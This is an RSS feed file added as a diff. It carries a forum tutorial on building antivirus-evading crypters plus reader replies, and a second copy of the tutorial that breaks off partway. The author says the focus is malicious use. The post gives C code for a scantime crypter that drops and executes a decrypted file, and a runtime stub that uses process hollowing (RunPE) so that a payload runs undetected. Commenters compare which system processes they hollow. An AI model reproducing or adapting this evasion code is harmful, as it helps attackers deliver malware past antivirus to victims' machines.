@@ -1,0 +1,863 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Crypters - Instruments of the Underground</title>
+    <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386</link>
+    <description>Welcome, to a guide on crypters and their technology. I&#39;ve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of [black magic](http://catb.org/jargon/html/D/deep-magic.html), something that&#39;s quite obscure in terms of being able to find information and do research. Of course, it has become very common in the hacking world, especially with the release of [Veil-Evasion](https://www.veil-framework.com/) and [Shellter](https://www.shellterproject.com/) in 2013 and 2014 respectively. In this write-up, I will be detailing the types of crypters and how they work on both the high level and then unraveling the lesser known magic on the lower code level. After reading this document, I hope you will all finally obtain some level of understanding on how these contraptions work and their position and roles in the computing world.
+
+**A slight disclaimer**: Some of the material may not be suitable for beginners as they require a fair amount of knowledge with Windows internals.
+```sql
+Proficiency in C/C++
+Knowledge of the WinAPI and its documentation
+Knowledge of basic cryptology
+Knowledge of the PE file structure
+Knowledge of Windows (virtual) memory
+Knowledge of Process and Threads.
+```
+- - - -
+## Two Sides of Cryptography
+When we describe _cryptography_, it usually includes something along the lines of &quot;_a means to obscure to prevent unwanted access to information_&quot;. Most of us see it as such, as a defensive mechanism with applications from securing secrets to perhaps even stopping malicious intent. Of course, we would expect this as it was invented for the sole purpose of denying any prying eyes from data however, as we will soon see, cryptography has evolved into something much more than that.
+
+If we look beyond the conventional use of cryptography to protect _against_ malicious intent, we can see the potential for protection _with_ malicious intent, that is, designing malware which harnesses the advantages with which cryptography provides. These types of malware are already very prominent in the modern age, some popular examples include ransomware and asymmetric backdoors which mainly deal with **public-key cryptography**. For more information on this, please see [Cryptovirology](https://scholar.google.com.au/scholar?q=Cryptovirology).
+- - - -
+##Antivirus Mechanisms
+To be able to design a protective measure against antivirus software, we must first identify the details what we are trying to defeat. I will briefly go over the two main methods which antivirus software employ to detect unwanted applications.
+###Signature-based Detection
+As the name implies, signature-based detection is a technique which cross-references and matches **signatures** of applications with a corresponding database of known malware. This is an effective measure at preventing and containing previous malware. Think of it like a vaccine for machines.
+###Heuristic-based Detection
+Although signature-based detection can prevent _most_ previously known malware, it has its disadvantages as malware authors can apply a layer of protection against this approach such as polymorphic and/or metamorphic code. The heuristic-based detection attempts to monitor the behavior and characteristics of an application and reference it with known malicious behavior. Note that this can only occur if the application is running.
+
+Of course, antivirus software is much, much more advanced than this. Since it is beyond my scope of this paper and my understanding I will not be covering that information.
+- - - -
+##An Introduction to Crypters
+For those who do not know what crypters are, they are software designed to protect the information within a file (usually some sort of executable format) and, on execution, be able to provide said information intact after extracting it with a decryption routine. Please note that while crypters _can_ be used with malicious intent, it is also popular with obfuscating data in an effort to prevent reverse engineering. In this paper, we will focus on malicious usage. So how does this work? Let&#39;s begin by identifying the aspects of crypters and seeing a graphical representation of their role.
+
+The **crypter** is responsible for encrypting a target object.
+```php
++-------------+      +-----------+      +-------------------+     +--------+
+|  Your file  |  -&gt;  |  Crypter  |  =&gt;  |  Encrypted file   |  +  |  Stub  |
++-------------+      +-----------+      +-------------------+     +--------+
+```
+
+The **stub** is the sector of the encrypted object which provides the extraction and, sometimes, the execution of said object.
+```php
++------------------+     +--------+                  +---------------+
+|  Encrypted file  |  +  |  Stub  |  = Execution =&gt;  | Original File | 
++------------------+     +--------+                  +---------------+
+```
+
+### Scantime Crypters
+These types of crypters are known as **scantime** due to their capability of obscuring data on disk which is where antivirus software can run a scan on the file with signature-based detection, for example. In this stage, the antivirus software will never be able to detect any malicious activity provided that the applied obfuscation is robust.
+
+### Runtime Crypters
+These crypters take it to the next level to deobfuscate the data on run in memory as it is required. By doing so, the antivirus will allow it to be loaded and executed _before_ it is able to react to any malicious activity. In this stage, it is pretty much game over if an application is quick enough to administer its payload and complete its objective. It is entirely possible for the malware to trigger a heuristic-based detection from the antivirus software in the execution stage and so malware authors should be careful.
+
+Now that we&#39;ve covered the high level, let&#39;s see an example implementation of both types.
+- - - -
+##Coding a Scantime Crypter
+The scantime crypter is the easier of the two since it does not require the knowledge of virtual memory and processes/threads. Essentially, the stub will deobfuscate the file, drop it onto disk somewhere and then execute it. The following documents a possible scantime crypter design.
+
+**Note**: For the sake of cleanliness and readability, I will not be including error checks.
+
+###Crypter and Stub Pseudocode
+```makefile
+1. Check if there is a command line argument
++-&gt; 2. If there is a command line argument, act as a crypter to crypt the file
+|   3. Open the target file
+|   4. Read file contents
+|   5. Encrypt the file contents
+|   6. Create a new file
+|   7. Write the encrypted into the new file
+|   8. Finish
+|
++-&gt; 2. If there is no command line argument, act as the stub
+    3. Open encrypted file
+    4. Read file contents
+    5. Decrypt the file contents
+    6. Create a temporary file
+    7. Write the decrypted into the temporary file
+    8. Execute the file
+    9. Finish
+```
+
+This design implements both the crypter and the stub in the same executable and we can do so because the two routines are pretty similar to each other. Let&#39;s go through a possible design in code.
+
+First, we will need to define main and the two conditions which define the execution as a crypter or a stub.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+Since we are defining the application as a window-based application, we cannot retrieve the `argc` and `argv` as we normally would in a console-based application but Microsoft has provided a solution to that with `__argc` and `__argv`. If the command line argument `__argv[1]` exists, the application will attempt to crypt the specified file, else, it will try to decrypt an existing crypted file.
+
+Moving onto the crypter routine, we&#39;ll require the handle to the specified file of `__argv[1]` and its size so we can copy its bytes into a buffer to crypt.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+        // open file to crypt
+        HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        // get file size
+        DWORD dwFileSize = GetFileSize(hFile, NULL);
+        
+        // crypt and get crypted bytes
+        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+The `Crypt` function will essentially read the file contents into a buffer and then crypt them and then return a pointer to the buffer with the encrypted bytes.
+```c
+LPVOID Crypt(HANDLE hFile, DWORD dwFileSize) {
+    // allocate buffer for file contents
+    LPVOID lpFileBytes = malloc(dwFileSize);
+    // read the file into the buffer
+    ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);
+
+    // apply XOR encryption
+    int i;
+    for (i = 0; i &lt; dwFileSize; i++) {
+        *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
+    }
+
+    return lpFileBytes;
+}
+```
+Now that we have the encrypted bytes, we will need to create a new file and then write these bytes into it.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+    } else {
+        // crypter routine
+        
+        ...
+
+        // get crypted file name in current directory
+        CHAR szCryptedFileName[MAX_PATH];
+        GetCurrentDirectory(MAX_PATH, szCryptedFileName);
+        strcat(szCryptedFileName, &quot;\\&quot;);
+        strcat(szCryptedFileName, CRYPTED_FILE);
+        // open handle to new crypted file
+        HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        // write to crypted file
+        WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
+        CloseHandle(hCryptedFile);
+        free(lpFileBytes);
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+And that&#39;s pretty much it for the crypter section. Note that we&#39;ve used a simple XOR to encrypt the contents of the file which _might_ not be enough if we have a small key. If we wanted to be more on the safe side, we can use other encryption schemes such as RC4 or (x)TEA. We do not require full-fledged unbroken cryptoalgorithms since the purpose is to avoid signature-based detection and would hence be complete overkill. Keep it small and simple.
+
+Let&#39;s continue onto the stub routine. For the stub, we want to retrieve the encrypted file in its current directory and then write the decrypted contents into a temporary file for execution.
+
+We&#39;ll begin by getting the current director, then opening the file and getting the file size.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        // get target encrypted file
+        CHAR szEncryptedFileName[MAX_PATH];
+        GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
+        strcat(szEncryptedFileName, &quot;\\&quot;);
+        strcat(szEncryptedFileName, CRYPTED_FILE);
+
+        // get handle to file
+        HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        // get file size
+        DWORD dwFileSize = GetFileSize(hFile, NULL);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+Pretty much the same as the crypter routine. Next, we will read the file contents and get the decrypted bytes. Since the XOR operation restores values given a common bit, we can simply reuse the `Crypt` function. After that, we will need to create a temporary file and write the decrypted bytes into it.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        
+        ...
+
+        // decrypt and obtain decrypted bytes
+        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
+        CloseHandle(hFile);
+
+        // get file in temporary directory
+        CHAR szTempFileName[MAX_PATH];
+        GetTempPath(MAX_PATH, szTempFileName);
+        strcat(szTempFileName, DECRYPTED_FILE);
+
+        // open handle to temp file
+        HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        // write to temporary file
+        WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
+        // clean up
+        CloseHandle(hTempFile);
+        free(lpFileBytes);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+Finally, we&#39;ll need to execute the decrypted application.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    if (__argc &lt; 2) {
+        // stub routine
+        
+        ...
+
+        // execute file
+        ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
+    } else {
+        // crypter routine
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+Do note that once the decrypted application has been written to disk, it will be completely exposed to antivirus software&#39;s signature-based detection and is likely to catch most malware. Because of this, malware authors require something which will allow the execution of their application(s) without this flaw. 
+
+This concludes the scantime crypter.
+
+- - - -
+## Coding a Runtime Crypter
+
+For the runtime crypter, I will only cover the stub since that includes the more complex material so we will assume the application has already been encrypted. A popular technique which these crypters use is called _RunPE_ or _Dynamic Forking/Process Hollowing_. How this works is the stub will first decrypt an application&#39;s encrypted bytes and then emulate the Windows loader by pushing them into the virtual memory space of a suspended process. Once that has been completed, the stub will resume the suspended process and finish.
+
+**Note**: For the sake of cleanliness and readability, I will not be including error checks.
+
+###Stub Pseudocode
+```makefile
+1. Decrypt application
+2. Create suspended process
+3. Preserve process&#39;s thread context
+4. Hollow out process&#39;s virtual memory space
+5. Allocate virtual memory
+6. Write application&#39;s header and sections into allocated memory
+7. Set modified thread context
+8. Resume process
+9. Finish
+```
+As we can see, this requires quite a bit of knowledge of Windows internals, including the PE file structure, Windows memory manipulation and processes/threads. I would highly recommend the reader to cover these fundamentals to understand the following material.
+
+Firstly, let&#39;s set up two routines in main, one for decrypting the encrypted application and the other to load it into memory for execution.
+```c
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    Decrypt();
+    RunPE();
+
+    return EXIT_SUCCESS;
+}
+```
+The `Decrypt` function will be entirely dependent on the encryption scheme used to encrypt the application but here is an example code using XOR.
+```c
+VOID Decrypt(VOID) {
+    int i;
+    for (i = 0; i &lt; sizeof(Shellcode); i++) {
+        Shellcode[i] ^= Key[i % sizeof(Key)];
+    }
+}
+```
+Now that the application has been decrypted, let&#39;s take a look at where the magic happens.
+Here, we will verify that the application is a valid PE file by checking the DOS and PE signatures.
+```c
+VOID RunPE(VOID) {
+    // check valid DOS signature
+    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
+    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    // check valid PE signature
+    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh-&gt;e_lfanew);
+    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) return;
+}
+```
+Now, we will create the suspended process.
+```c
+VOID RunPE(VOID) {
+    ...
+
+    // get own full file name
+    CHAR szFileName[MAX_PATH];
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    // initialize startup and process information
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&amp;si, sizeof(si));
+    ZeroMemory(&amp;pi, sizeof(pi));
+    // required to set size of si.cb before use
+    si.cb = sizeof(si);
+    // create suspended process
+    CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
+
+}
+```
+Note that `szFileName` can be a full path to any executable file such as `explorer.exe` or `iexplore.exe` but for this example, we will be using the stub&#39;s file. The `CreateProcess` function will create a child process of the specified file in a suspended state so that we can modify its virtual memory contents to our needs. Once that has been achieved, we should obtain its thread context before changing anything.
+```c
+VOID RunPE(VOID) {
+    ...
+
+    // obtain thread context
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.Thread, &amp;ctx);
+
+}
+```
+And now will hollow out an area of the process&#39;s virtual memory so we can allocate our own space for the application. For this, we require a function which is not readily available to us so we will require a function pointer to point to a dynamically retrieved function from the `ntdll.dll` DLL.
+```c
+typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);
+
+VOID RunPE(VOID) {
+    ...
+
+    // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
+    fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;), &quot;ZwUnmapViewOfSection&quot;);
+    // hollow process at virtual memory address &#39;pinh-&gt;OptionalHeader.ImageBase&#39;
+    pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);
+
+    // allocate virtual memory at address &#39;pinh-&gt;OptionalHeader.ImageBase&#39; of size `pinh-&gt;OptionalHeader.SizeofImage` with RWX permissions
+    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+}
+```
+Since the suspended process has its own content inside its virtual memory space, we are required to unmap it from memory and then allocate our own so that we have the correct access and permissions to load our application&#39;s image. We will do this with the `WriteProcessMemory` function. First, we need to write the headers and then each section individually as the Windows loader would. This section requires a thorough understanding of the PE file structure.
+```c
+VOID RunPE(VOID) {
+    ...
+
+    // write header
+    WriteProcessMemory(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, Shellcode, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL);
+
+    // write each section
+    int i;
+    for (i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
+        // calculate and get ith section
+        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
+        // write section data
+        WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish-&gt;VirtualAddress), (LPVOID)((DWORD)Shellcode + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
+    }
+
+}
+```
+Now that everything is in place, we will simply modify the context&#39;s address of entry point and then resume the suspended thread.
+```c 
+VOID RunPE(VOID) {
+    ...
+ 
+    // set appropriate address of entry point
+    ctx.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(pi.hThread, &amp;ctx);
+ 
+    // resume and execute our application
+    ResumeThread(pi.hThread);
+}
+```
+Now, the application is running within memory and hopefully, antivirus software will not detect it as it unleashes itself.
+- - - -
+##Conclusion
+Hopefully, at least the high level and some low level concepts have been communicated well enough for the reader to understand. If some things are still completely incomprehensible, I would highly encourage self-research on the listed topics at the beginning of this paper. If some small things are a bit unclear, do not hesitate to ask. This was not targeted at a beginner-level audience.
+
+Thank you for reading.
+
+_-- dtm_</description>
+    
+    <lastBuildDate>Wed, 17 Jan 2018 03:34:05 +0000</lastBuildDate>
+    <category>Cryptology</category>
+    <atom:link href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[_py]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/11</link>
+        <pubDate>Wed, 17 Jan 2018 05:26:24 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-11</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="0xd4v3" data-post="9" data-topic="386">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/0xd4v3/48/1449_2.png" class="avatar"> 0xd4v3:</div>
+<blockquote>
+<p>One question though… Why aren’t you closing the hFile handle after reading it?</p>
+</blockquote>
+</aside>
+<p>Because <span class="bbcode-s">skids</span> hackers write terrible code! Nah, probably because I forgot.</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/10</link>
+        <pubDate>Wed, 17 Jan 2018 03:34:05 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-10</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[0xd4v3]]></dc:creator>
+        <description><![CDATA[
+            <p>This is awesome! It’s quite hard getting used to the WinAPI, I hate these “new” data types. One question though… Why aren’t you closing the <code>hFile</code> handle after reading it?</p>
+<p>EDIT: The <code>GetCurrentDirectory()</code> stuff is unnecessary since <code>CreateFile</code> is going to create the file with <code>CRYPTED_FILE</code> name in the same directory. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Not trying to be a smartass just stating my findings while playing with the code. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/9</link>
+        <pubDate>Tue, 16 Jan 2018 23:13:41 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-9</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[OWL]]></dc:creator>
+        <description><![CDATA[
+            <p>This really awesome post ,  detailed and very helpful information. thank you for sharing.</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/8</link>
+        <pubDate>Sat, 13 May 2017 17:17:49 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-8</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>I’m not entirely sure yet. I’ve not had much experience with 64-bit to tell any differences from 32-bit but there shouldn’t need to be any changes except compiling the stub as 64-bit and having a 64-bit application.</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/7</link>
+        <pubDate>Thu, 19 May 2016 01:05:27 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-7</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[Merozey]]></dc:creator>
+        <description><![CDATA[
+            <p>Very nice article! I haven’t done much re-search on crypters, so i’m glad you are starting this series!</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/6</link>
+        <pubDate>Wed, 18 May 2016 19:10:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-6</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[Cal0X]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah, I was asking in general. Just out of curiosity, what changes should be made in the program for 64 bit?</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/5</link>
+        <pubDate>Wed, 18 May 2016 16:00:03 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-5</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>For this purpose, I use the stub itself. Since the stub is 32-bit, it cannot interact with those two processes on 64-bit machines (which I have).</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/4</link>
+        <pubDate>Wed, 18 May 2016 11:29:55 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-4</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[Cal0X]]></dc:creator>
+        <description><![CDATA[
+            <p>Wonderful! Which process do you normally hollow? I myself use svchost.exe or explorer.exe.</p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/3</link>
+        <pubDate>Wed, 18 May 2016 11:23:21 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-3</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Wow! Really good article DTM! I think I’ll need to re-read this a few times to fully understand it <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386/2</link>
+        <pubDate>Wed, 18 May 2016 05:06:18 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-386-2</guid>
+        <source url="https://d.clarkee.co.uk/t/crypters-instruments-of-the-underground/386.rss">Crypters - Instruments of the Underground</source>
+      </item>
+      <item>
+        <title>Crypters - Instruments of the Underground</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Welcome, to a guide on crypters and their technology. I’ve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of <a href="http://catb.org/jargon/html/D/deep-magic.html">black magic</a>, something that’s quite obscure in terms of being able to find information and do research. Of course, it has become very common in the hacking world, especially with the release of <a href="https://www.veil-framework.com/">Veil-Evasion</a> and <a href="https://www.shellterproject.com/">Shellter</a> in 2013 and 2014 respectively. In this write-up, I will be detailing the types of crypters and how they work on both the high level and then unraveling the lesser known magic on the lower code level. After reading this document, I hope you will all finally obtain some level of understanding on how these contraptions work and their position and roles in the computing world.</p>
+<p><strong>A slight disclaimer</strong>: Some of the material may not be suitable for beginners as they require a fair amount of knowledge with Windows internals.</p>
+<pre><code class="lang-sql">Proficiency in C/C++
+Knowledge of the WinAPI and its documentation
+Knowledge of basic cryptology
+Knowledge of the PE file structure
+Knowledge of Windows (virtual) memory
+Knowledge of Process and Threads.
+</code></pre>
+<hr>
+<h2>Two Sides of Cryptography</h2>
+<p>When we describe <em>cryptography</em>, it usually includes something along the lines of “<em>a means to obscure to prevent unwanted access to information</em>”. Most of us see it as such, as a defensive mechanism with applications from securing secrets to perhaps even stopping malicious intent. Of course, we would expect this as it was invented for the sole purpose of denying any prying eyes from data however, as we will soon see, cryptography has evolved into something much more than that.</p>
+<p>If we look beyond the conventional use of cryptography to protect <em>against</em> malicious intent, we can see the potential for protection <em>with</em> malicious intent, that is, designing malware which harnesses the advantages with which cryptography provides. These types of malware are already very prominent in the modern age, some popular examples include ransomware and asymmetric backdoors which mainly deal with <strong>public-key cryptography</strong>. For more information on this, please see <a href="https://scholar.google.com.au/scholar?q=Cryptovirology">Cryptovirology</a>.</p>
+<hr>
+<p>#<span class="hashtag">#Antivirus</span> Mechanisms<br>
+To be able to design a protective measure against antivirus software, we must first identify the details what we are trying to defeat. I will briefly go over the two main methods which antivirus software employ to detect unwanted applications.<br>
+##<span class="hashtag">#Signature-based</span> Detection<br>
+As the name implies, signature-based detection is a technique which cross-references and matches <strong>signatures</strong> of applications with a corresponding database of known malware. This is an effective measure at preventing and containing previous malware. Think of it like a vaccine for machines.<br>
+##<span class="hashtag">#Heuristic-based</span> Detection<br>
+Although signature-based detection can prevent <em>most</em> previously known malware, it has its disadvantages as malware authors can apply a layer of protection against this approach such as polymorphic and/or metamorphic code. The heuristic-based detection attempts to monitor the behavior and characteristics of an application and reference it with known malicious behavior. Note that this can only occur if the application is running.</p>
+<p>Of course, antivirus software is much, much more advanced than this. Since it is beyond my scope of this paper and my understanding I will not be covering that information.</p>
+<hr>
+<p>#<span class="hashtag">#An</span> Introduction to Crypters<br>
+For those who do not know what crypters are, they are software designed to protect the information within a file (usually some sort of executable format) and, on execution, be able to provide said information intact after extracting it with a decryption routine. Please note that while crypters <em>can</em> be used with malicious intent, it is also popular with obfuscating data in an effort to prevent reverse engineering. In this paper, we will focus on malicious usage. So how does this work? Let’s begin by identifying the aspects of crypters and seeing a graphical representation of their role.</p>
+<p>The <strong>crypter</strong> is responsible for encrypting a target object.</p>
+<pre><code class="lang-php">+-------------+      +-----------+      +-------------------+     +--------+
+|  Your file  |  -&gt;  |  Crypter  |  =&gt;  |  Encrypted file   |  +  |  Stub  |
++-------------+      +-----------+      +-------------------+     +--------+
+</code></pre>
+<p>The <strong>stub</strong> is the sector of the encrypted object which provides the extraction and, sometimes, the execution of said object.</p>
+<pre><code class="lang-php">+------------------+     +--------+                  +---------------+
+|  Encrypted file  |  +  |  Stub  |  = Execution =&gt;  | Original File | 
++------------------+     +--------+                  +---------------+
+</code></pre>
+<h3>Scantime Crypters</h3>
+<p>These types of crypters are known as <strong>scantime</strong> due to their capability of obscuring data on disk which is where antivirus software can run a scan on the file with signature-based detection, for example. In this stage, the antivirus software will never be able to detect any malicious activity provided that the applied obfuscation is robust.</p>
+<h3>Runtime Crypters</h3>
